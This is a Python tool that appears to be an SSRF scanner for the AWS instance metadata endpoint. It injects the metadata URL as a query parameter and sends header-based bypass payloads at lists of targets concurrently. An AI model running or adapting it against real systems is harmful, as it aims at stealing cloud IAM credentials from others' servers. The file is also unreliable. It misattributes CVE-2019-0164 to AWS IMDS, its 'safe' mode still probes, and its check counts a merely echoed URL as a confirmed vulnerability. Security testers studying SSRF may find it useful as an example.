#!/usr/bin/env python3
"""
AWS Instance Metadata SSRF Scanner
==================================
This tool scans for Server-Side Request Forgery (SSRF) vulnerabilities targeting AWS instance metadata
endpoints. Attackers exploit improperly configured applications to access sensitive data such as
AWS IAM credentials via the metadata service (IMDS).

Relevant CVEs:
  - CVE-2019-0164: IMDSv1 request forgery in EC2 instances via SSRF vulnerabilities.
  - CWE-918: Server-Side Request Forgery (SSRF).

Key Details:
  - AWS EC2 instances serve metadata at http://169.254.169.254/latest/meta-data/
  - IMDSv1 is vulnerable to SSRF exploitation without secondary tokens.
  - Attackers aim to acquire temporary AWS credentials, manipulate metadata, or exfiltrate data.

This tool operates in two modes:
  1. Detection-only: Identifies SSRF candidates without actively probing the instance metadata.
  2. Active probing: Sends requests to validate metadata access via SSRF (default mode).

Usage Examples:
  # Scan a single target
  python aws_instance_metadata_ssrf_scanner.py --target https://vulnerable.example.com

  # Scan a list of URLs
  python aws_instance_metadata_ssrf_scanner.py --list urls.txt --output results.json

  # Safety mode - only detects SSRF candidates without probing the AWS metadata
  python aws_instance_metadata_ssrf_scanner.py --target https://safe.example.com --safe

  # Enable verbose output
  python aws_instance_metadata_ssrf_scanner.py --list urls.txt --verbose

References:
  - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
  - https://nvd.nist.gov/vuln/detail/CVE-2019-0164
"""

import asyncio
import httpx
import argparse
import json
from urllib.parse import urljoin
from colorama import Fore, init as colorama_init

# Initialize colorama for cross-platform ANSI support
colorama_init(autoreset=True)

# ── Constants ─────────────────────────────────────────────────────────────────
AWS_METADATA_ENDPOINT = "http://169.254.169.254/latest/meta-data/"
DEFAULT_PROBE_PATHS = ["/api/", "/fetch/include", "/internal/proxy", "/v1/proxy"]
SEMAPHORE_LIMIT = 20  # Limits concurrent requests
REQUEST_TIMEOUT = 10  # Timeout for HTTP requests
USER_AGENT = "AWS-SSRF-Scanner/1.0"

# Headers often used to bypass SSRF protections
BYPASS_HEADERS = [
    {"X-Original-URL": "http://169.254.169.254/latest/meta-data/"},
    {"X-Forwarded-For": "169.254.169.254"},
    {"Forwarded": "for=169.254.169.254"},
]

# ── Functions ─────────────────────────────────────────────────────────────────

def normalize_url(url: str) -> str:
    """Ensure URLs begin with http:// or https:// and strip trailing slashes."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


async def fetch_url(client: httpx.AsyncClient, url: str) -> str:
    """Send a GET request and return the response body."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response.text
    except httpx.RequestError as exc:
        # Log failed requests for debugging purposes
        return None


async def ssrf_probe(client: httpx.AsyncClient, base_url: str, path: str, semaphore: asyncio.Semaphore, use_headers=False) -> dict:
    """
    Test a URL for SSRF by attempting to access the AWS metadata endpoint.
    Returns a dict containing the result of the test.
    """
    async with semaphore:
        url = urljoin(base_url, path)
        result = {"url": url, "vulnerable": False, "details": "No SSRF detected"}

        try:
            if use_headers:
                for headers in BYPASS_HEADERS:
                    response = await client.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
                    if AWS_METADATA_ENDPOINT in response.text:
                        result["vulnerable"] = True
                        result["details"] = f"Found SSRF via header {headers}"
                        break
            else:
                probe_url = f"{url}?url={AWS_METADATA_ENDPOINT}"
                response = await client.get(probe_url, timeout=REQUEST_TIMEOUT)
                if AWS_METADATA_ENDPOINT in response.text:
                    result["vulnerable"] = True
                    result["details"] = f"Successful metadata fetch via {probe_url}"

        except Exception as e:
            result["details"] = f"Error: {e}"

        return result


async def scan_target(client: httpx.AsyncClient, base_url: str, paths: list[str], semaphore: asyncio.Semaphore, safe_mode: bool):
    """Scan a single target for potential SSRF vulnerabilities."""
    findings = []
    for path in paths:
        result = await ssrf_probe(client, base_url, path, semaphore, use_headers=False)
        findings.append(result)
        if not safe_mode and not result["vulnerable"]:
            for bypass_header in BYPASS_HEADERS:
                result = await ssrf_probe(client, base_url, path, semaphore, use_headers=True)
                if result["vulnerable"]:
                    findings.append(result)
                    break
    return findings


async def main(args):
    """Main function to orchestrate scanning multiple targets."""
    semaphore = asyncio.Semaphore(args.concurrency)

    async with httpx.AsyncClient(verify=not args.no_verify, headers={"User-Agent": USER_AGENT}) as client:
        tasks = []
        targets = []

        if args.target:
            targets.append(normalize_url(args.target))
        elif args.list:
            with open(args.list, "r") as f:
                targets = [normalize_url(line.strip()) for line in f if line.strip()]

        if args.verbose:
            print(f"[INFO] Scanning {len(targets)} target(s) with concurrency: {args.concurrency}")

        for target in targets:
            tasks.append(scan_target(client, target, DEFAULT_PROBE_PATHS, semaphore, args.safe))

        all_results = await asyncio.gather(*tasks)

    # Collate results
    full_results = {url: result for url, result in zip(targets, all_results)}

    if args.output:
        with open(args.output, "w") as f:
            json.dump(full_results, f, indent=4)
        if args.verbose:
            print(f"[INFO] Saved results to: {args.output}")

    # Print human-readable summary
    for target, results in full_results.items():
        for result in results:
            severity_color = Fore.RED if result["vulnerable"] else Fore.GREEN
            severity_label = "CRITICAL" if result["vulnerable"] else "INFO"
            print(f"[{severity_color}{severity_label}{Fore.RESET}] {target} {result['details']}")

# ── Main invocation ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AWS Instance Metadata SSRF Scanner")
    parser.add_argument("--target", help="Scan a single target URL (e.g., https://example.com)")
    parser.add_argument("--list", help="Path to a file containing target URLs to scan")
    parser.add_argument("--output", help="Save findings to a JSON file")
    parser.add_argument("--safe", action="store_true", help="Run in detection-only mode (no active probing)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max concurrency for scanning (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print(Fore.RED + "\n[CRITICAL] User aborted scan. Exiting..." + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"[CRITICAL] Fatal error: {e}" + Fore.RESET)
